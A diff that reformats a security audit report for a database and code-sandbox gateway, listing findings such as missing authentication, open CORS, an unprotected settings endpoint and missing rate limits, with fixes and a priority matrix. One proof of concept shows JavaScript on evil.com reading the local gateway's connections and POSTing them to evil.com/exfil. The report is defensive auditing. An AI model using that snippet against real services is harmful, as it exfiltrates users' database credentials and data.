@@ -30,6 +30,7 @@ app.add_middleware(CORSMiddleware, allow_origins=["*"], ...)  # wide open
 ```
 
 **Impact:** Any network-adjacent attacker can:
+
 - Create/delete database connections
 - Execute arbitrary code in sandboxes
 - Read all audit logs (including SQL queries with potentially sensitive data)
@@ -37,6 +38,7 @@ app.add_middleware(CORSMiddleware, allow_origins=["*"], ...)  # wide open
 - Exfiltrate credential metadata
 
 **Recommendation:**
+
 1. Add JWT or API key authentication middleware
 2. Implement role-based access control (admin vs. read-only)
 3. Restrict CORS origins to the frontend domain only
@@ -58,17 +60,24 @@ app.add_middleware(
 ```
 
 **Impact:** Any website can make cross-origin requests to the gateway. Combined with CRIT-01 (no auth), a malicious webpage opened in the same browser can:
+
 - Enumerate and exfiltrate all database connections
 - Execute SQL queries against connected databases
 - Run arbitrary Python code in sandboxes
 - Modify settings to redirect the sandbox manager to an attacker-controlled server
 
 **PoC:** A user visiting `evil.com` while the gateway is running on `localhost:3300`:
+
 ```javascript
 // evil.com can do this
 fetch("http://localhost:3300/api/connections")
-  .then(r => r.json())
-  .then(data => fetch("https://evil.com/exfil", {method:"POST", body: JSON.stringify(data)}));
+  .then((r) => r.json())
+  .then((data) =>
+    fetch("https://evil.com/exfil", {
+      method: "POST",
+      body: JSON.stringify(data),
+    }),
+  );
 ```
 
 **Recommendation:** Set `allow_origins` to `["http://localhost:3200"]` at minimum. Add `allow_credentials=False`.
@@ -80,6 +89,7 @@ fetch("http://localhost:3300/api/connections")
 **Location:** `gateway/main.py:140-144`, `gateway/store.py:57-65`
 
 The `PUT /api/settings` endpoint allows unauthenticated modification of `sandbox_manager_url`. An attacker can redirect all code execution to a malicious server that:
+
 - Captures all code sent for execution (including any secrets in the code)
 - Returns manipulated results
 - Acts as a man-in-the-middle for all sandbox operations
@@ -158,6 +168,7 @@ def validate_sql(sql, ...):
 ```
 
 Similarly for `inject_limit`:
+
 ```python
 if not HAS_SQLGLOT:
     upper = sql.upper()
@@ -200,6 +211,7 @@ However, the secondary defense (`len(statements) > 1` check via sqlglot parse at
 **Location:** `gateway/mcp_server.py:55-113`, `gateway/main.py:254-286`
 
 There is no rate limiting on the `/execute` endpoint or `execute_code` MCP tool. An attacker can:
+
 - Exhaust all VM slots (MAX_VMS=10) with long-running code
 - Cause resource starvation (CPU, memory, disk I/O)
 - Fill disk with overlays (`shutil.copy2` of rootfs for each execution)
@@ -285,11 +297,13 @@ All communication (gateway, sandbox manager, frontend) uses plain HTTP. Database
 **Location:** `gateway/store.py:164-199`
 
 The audit log (`audit.jsonl`) is an append-only JSON lines file with no integrity protection. An attacker with file system access can:
+
 - Delete entries to cover tracks
 - Modify entries to frame others
 - Corrupt the file to prevent audit review
 
 The `read_audit` function silently swallows parse errors:
+
 ```python
 except Exception:
     pass  # corrupted entries silently ignored
@@ -330,6 +344,7 @@ exec(compile(code, "<sandbox>", "exec"), {"__builtins__": __builtins__})
 Full `__builtins__` are available, including `open()`, `__import__()`, `eval()`, etc. While Firecracker provides strong isolation, within the VM the code has full privileges (runs as PID 1 / root equivalent).
 
 This is somewhat mitigated by the ephemeral nature of the VMs, but code could:
+
 - Attempt network connections (if any networking is configured)
 - Read the base rootfs contents
 - Attempt kernel exploits (though Firecracker's seccomp filters mitigate this)
@@ -349,6 +364,7 @@ await connector.close()              # destroys pool
 ```
 
 Every query creates a new connection pool (1-5 TCP connections) and destroys it after. Under load:
+
 - TCP port exhaustion (TIME_WAIT accumulation)
 - Unnecessary SSL handshake overhead
 - PostgreSQL backend process churn
@@ -362,6 +378,7 @@ Every query creates a new connection pool (1-5 TCP connections) and destroys it 
 **Location:** `gateway/mcp_server.py:55,117`
 
 The `execute_code` and `query_database` MCP tools accept arbitrarily large inputs. A multi-megabyte SQL query or code string could:
+
 - Cause memory exhaustion during sqlglot parsing
 - Slow down regex stacking detection
 - Fill the audit log with huge entries
@@ -410,6 +427,7 @@ Default credentials in the development compose file. If this file is used in any
 **Location:** `gateway/mcp_server.py:86,179-188`
 
 Sandbox URLs and internal configuration details are returned in tool responses that may be visible in Claude Code conversation history:
+
 - Sandbox manager URLs
 - Execution timing metadata
 - Full SQL queries in audit entries
@@ -453,6 +471,7 @@ Truncating UUIDs to 8 characters (32 bits) significantly increases collision pro
 **Location:** `signalpilot/web/` (Next.js frontend)
 
 The web frontend doesn't set CSP, X-Frame-Options, or other security headers. This allows:
+
 - Clickjacking via iframe embedding
 - XSS if any user input is reflected
 
@@ -516,25 +535,26 @@ Listed as a dependency in `pyproject.toml` but no code uses it. This was likely 
 
 ## Recommendations Priority Matrix
 
-| Priority | Finding | Effort | Impact |
-|----------|---------|--------|--------|
-| P0 | CRIT-01: Add authentication | Medium | Blocks all remote attacks |
-| P0 | CRIT-02: Restrict CORS | Trivial | Blocks cross-origin attacks |
-| P0 | CRIT-03: Protect settings endpoint | Low | Blocks sandbox redirect |
-| P1 | HIGH-07: Auth on sandbox manager | Low | Blocks direct code execution |
-| P1 | HIGH-01: Encrypt settings secrets | Low | Protects API keys at rest |
-| P1 | HIGH-03: Remove sqlglot fallback | Trivial | Eliminates validation bypass |
-| P1 | HIGH-06: Sanitize error messages | Low | Prevents info disclosure |
-| P2 | HIGH-05: Add rate limiting | Medium | Prevents DoS |
-| P2 | MED-06: Reuse connection pools | Medium | Prevents resource exhaustion |
-| P2 | MED-07: Input length limits | Low | Prevents memory abuse |
-| P3 | MED-01-05: Various | Varies | Defense in depth |
+| Priority | Finding                            | Effort  | Impact                       |
+| -------- | ---------------------------------- | ------- | ---------------------------- |
+| P0       | CRIT-01: Add authentication        | Medium  | Blocks all remote attacks    |
+| P0       | CRIT-02: Restrict CORS             | Trivial | Blocks cross-origin attacks  |
+| P0       | CRIT-03: Protect settings endpoint | Low     | Blocks sandbox redirect      |
+| P1       | HIGH-07: Auth on sandbox manager   | Low     | Blocks direct code execution |
+| P1       | HIGH-01: Encrypt settings secrets  | Low     | Protects API keys at rest    |
+| P1       | HIGH-03: Remove sqlglot fallback   | Trivial | Eliminates validation bypass |
+| P1       | HIGH-06: Sanitize error messages   | Low     | Prevents info disclosure     |
+| P2       | HIGH-05: Add rate limiting         | Medium  | Prevents DoS                 |
+| P2       | MED-06: Reuse connection pools     | Medium  | Prevents resource exhaustion |
+| P2       | MED-07: Input length limits        | Low     | Prevents memory abuse        |
+| P3       | MED-01-05: Various                 | Varies  | Defense in depth             |
 
 ---
 
 ## Test Database Setup
 
 For pentest validation, see `testing/docker-compose.yml` which creates:
+
 - **enterprise-pg** (port 5601): OLTP database with customers, orders, payments, employees (with PII like SSN hashes, bank accounts), and an `internal_credentials` table with fake API keys
 - **warehouse-pg** (port 5602): Analytics warehouse with star-schema fact/dimension tables, raw event data, and ML model outputs
 
